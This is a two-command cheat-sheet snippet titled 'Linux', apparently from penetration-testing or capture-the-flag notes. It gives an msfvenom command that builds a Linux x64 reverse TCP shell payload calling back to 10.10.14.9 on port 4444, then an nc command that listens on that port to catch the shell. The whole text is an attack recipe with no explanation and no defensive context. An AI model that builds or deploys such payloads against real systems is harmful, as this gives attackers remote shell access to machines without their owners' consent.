# Linux

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 PrependFork=true -o
rev
```

```bash
nc -nvlp 4444
```

